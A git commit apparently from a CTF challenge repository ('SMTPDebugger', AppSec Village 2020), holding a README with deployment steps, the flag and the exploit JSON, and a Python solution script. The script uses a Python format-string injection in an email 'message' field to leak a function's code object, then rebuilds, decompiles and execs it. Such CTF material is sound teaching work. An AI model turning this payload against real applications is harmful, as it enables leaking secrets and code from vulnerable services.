307e35282ae11f54159b363bb04a5a3def719dfd
realgam3 <realgam3@gmail.com>
2020-08-03 22:44:18 +0300

    Initial Commit

---
+++ README.md
@@ -0,0 +1,43 @@
+# StuckOverflow
+**[AppSec Village CTF Task Fight 2020]** SMTPDebugger
+
+![Challenge Description](resources/img/description.png)
+_________________________________________________________
+
+### Challenge Storyline
+Company created a Debugger APP for SMTP.  
+The mission is to get the flag by reviewing the vulnerable part of the application and calling the function **get_flag**.
+
+### Challenge Design
+The challenge components are:  
+* load-balancer (Nginx Load Balancer)  
+* challenge (Socat - Forked Python Process)  
+
+![Challenge Diagram](resources/img/diagram.png)
+
+### Challenge Purpose
+* Code Review  
+* Lear how dangerous of python string formats are  
+* Learn how to recreate python code remotely using code objects  
+
+### Challenge Deployment
+1) Deploy the app: docker-compose up --build -d
+2) For Scaling: docker-compose scale challenge=3
+
+### Challenge Solution
+1) Execute solution.py (tested with python3)
+   ```bash
+   python solution.py -s {HOST} -p {PORT}
+   ```
+   * Example: `python solution.py -s localhost.realgame.co.il -p 3780`
+2) You got the flag: **CTF{F0rmat_plus_C0d3_Obj3ct_Equ4l5_Flag}**
+
+The exploit send this JSON to the server:  
+```javascript
+{"from_addr": "from@addr.com", "to_addrs": "to@addr.com", "subject": "subject", "message": "co_argcount={email.get_flag.__code__.co_argcount};co_cellvars={email.get_flag.__code__.co_cellvars};co_code={email.get_flag.__code__.co_code};co_consts={email.get_flag.__code__.co_consts};co_filename='{email.get_flag.__code__.co_filename}';co_firstlineno={email.get_flag.__code__.co_firstlineno};co_flags={email.get_flag.__code__.co_flags};co_freevars={email.get_flag.__code__.co_freevars};co_kwonlyargcount={email.get_flag.__code__.co_kwonlyargcount};co_lnotab={email.get_flag.__code__.co_lnotab};co_name='{email.get_flag.__code__.co_name}';co_names={email.get_flag.__code__.co_names};co_nlocals={email.get_flag.__code__.co_nlocals};co_stacksize={email.get_flag.__code__.co_stacksize};co_varnames={email.get_flag.__code__.co_varnames};"}
+```
+In response it will get a the whole SMTP message, the message body will contain all the arguments of the code object...  
+With those arguments it will create code object and replace the code of the current **get_flag** function.  
+
+### Notes
+Do not forget to upload **SMTPDebugger.py** to CTFd, it's the same as challenge but without the flag...  
---
+++ solution_alternative.py
@@ -0,0 +1,112 @@
+import re
+import json
+import socket
+from io import StringIO
+from types import CodeType
+from argparse import ArgumentParser
+from SMTPDebugger import SMTPDebugger
+
+try:
+    import uncompyle6
+except ImportError:
+    print("You should `pip install uncompyle6`")
+    exit(1)
+
+
+def decrypt_code(code_obj, version=None):
+    sio = StringIO()
+    uncompyle6.main.deparse_code_with_map(
+        version=version,
+        co=code_obj,
+        out=sio
+    )
+    sio.seek(0)
+    return sio.read()
+
+
+def exploit(host="localhost", port=3780):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((host, port))
+        data = s.recv(4096)
+
+        s.sendall(json.dumps({
+            "from_addr": "from@addr.com",
+            "to_addrs": "to@addr.com",
+            "subject": "subject",
+            "message": "co_argcount={email.get_flag.__code__.co_argcount};"
+                       "co_cellvars={email.get_flag.__code__.co_cellvars};"
+                       "co_code={email.get_flag.__code__.co_code};"
+                       "co_consts={email.get_flag.__code__.co_consts};"
+                       "co_filename='{email.get_flag.__code__.co_filename}';"
+                       "co_firstlineno={email.get_flag.__code__.co_firstlineno};"
+                       "co_flags={email.get_flag.__code__.co_flags};"
+                       "co_freevars={email.get_flag.__code__.co_freevars};"
+                       "co_kwonlyargcount={email.get_flag.__code__.co_kwonlyargcount};"
+                       "co_lnotab={email.get_flag.__code__.co_lnotab};"
+                       "co_name='{email.get_flag.__code__.co_name}';"
+                       "co_names={email.get_flag.__code__.co_names};"
+                       "co_nlocals={email.get_flag.__code__.co_nlocals};"
+                       "co_stacksize={email.get_flag.__code__.co_stacksize};"
+                       "co_varnames={email.get_flag.__code__.co_varnames};"
+        }).encode('utf-8') + b"\n")
+
+        data += s.recv(4096)
+        res = re.search("co_argcount=(?P<co_argcount>.*);"
+                        "co_cellvars=(?P<co_cellvars>.*);"
+                        "co_code=(?P<co_code>.*);"
+                        "co_consts=(?P<co_consts>.*);"
+                        "co_filename=(?P<co_filename>'.*');"
+                        "co_firstlineno=(?P<co_firstlineno>.*);"
+                        "co_flags=(?P<co_flags>.*);"
+                        "co_freevars=(?P<co_freevars>.*);"
+                        "co_kwonlyargcount=(?P<co_kwonlyargcount>.*);"
+                        "co_lnotab=(?P<co_lnotab>.*);"
+                        "co_name=(?P<co_name>'.*');"
+                        "co_names=(?P<co_names>.*);"
+                        "co_nlocals=(?P<co_nlocals>.*);"
+                        "co_stacksize=(?P<co_stacksize>.*);"
+                        "co_varnames=(?P<co_varnames>.*);", data.decode('unicode_escape'))
+
+        co_args = res.groupdict()
+        for co_arg in co_args:
+            co_args[co_arg] = eval(co_args[co_arg])
+
+        code = CodeType(
+            co_args['co_argcount'],
+            co_args['co_kwonlyargcount'],
+            co_args['co_nlocals'],
+            co_args['co_stacksize'],
+            co_args['co_flags'],
+            co_args['co_code'],
+            co_args['co_consts'],
+            co_args['co_names'],
+            co_args['co_varnames'],
+            co_args['co_filename'],
+            co_args['co_name'],
+            co_args['co_firstlineno'],
+            co_args['co_lnotab'],
+            co_args['co_freevars'],
+            co_args['co_cellvars'],
+        )
+
+        func_content = '\n    '.join([''] + decrypt_code(code).splitlines())
+        func_code = f"def {co_args['co_name']}():{func_content}\n"
+        # print(data.decode())
+        # print(func_code)
+        exec(f"{func_code}\nprint({co_args['co_name']}())")
+
+
+if __name__ == "__main__":
+    parser = ArgumentParser()
+
+    # Proxy Configuration
+    parser.add_argument("-s", "--host",
+                        help="application host",
+                        default="localhost")
+    parser.add_argument("-p", "--port",
+                        help="application port",
+                        type=int,
+                        default=3780)
+    sys_args = vars(parser.parse_args())
+
+    exploit(**sys_args)
